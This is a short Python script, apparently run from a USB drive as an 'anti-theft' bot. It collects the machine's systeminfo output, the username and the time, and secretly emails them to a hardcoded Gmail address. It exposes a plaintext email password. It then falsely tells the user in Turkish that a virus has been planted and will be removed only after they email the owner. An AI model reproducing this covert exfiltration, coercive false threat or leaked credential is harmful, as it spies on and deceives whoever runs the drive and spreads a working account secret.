import smtplib
import datetime
from email.message import EmailMessage
import os
import sys
from time import sleep
from getpass import getuser

user = getuser()
time = datetime.datetime.now()
time = str(time)

EMAIL_ADRESS = 'bothasanaslan@gmail.com'
EMAIL_PASSWORD = '8448209aAbot'
receiver = 'aslanhassan98@gmail.com'

os.system('title Aslan Security Bot')
os.system('@echo off')

for a in 'Lütfen bekleyin. Sakın kapatmayın!':
    print(a, end='')
    sys.stdout.flush()
    sleep(0.1)
os.system('cls')

os.system('systeminfo > info.txt')

new_message = f"Your USB disk inserted at {time} by {user}"
print('Inceleniyor.')

msg = EmailMessage()
msg['Subject'] = 'Aslan bot uploader'
msg['From'] = EMAIL_ADRESS
msg['To'] = receiver
msg.set_content(f'{new_message}\n\n\n\tThis files have been sent by aslanbot.')

file = 'info.txt'
with open(file, 'rb') as f:
    file_data = f.read()
    file_name = f.name
msg.add_attachment(file_data, maintype='application', subtype='octet-stream', filename=file_name)
with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
    smtp.login(EMAIL_ADRESS, EMAIL_PASSWORD)
    smtp.send_message(msg)

os.system('color f4')

print('''
		Owner: Hasan Aslan

		Mail: aslanhassan98@gmail.com

		Program güvenlik nedeniyle bilgisayarınıza bir virüs yerleştirdi.Lütfen bu usb'yi sahibine teslim
		etmek için yukarıdaki adrese mail atın. Karşılığında virüs kaldırılacaktır.
			''')

input()
input()
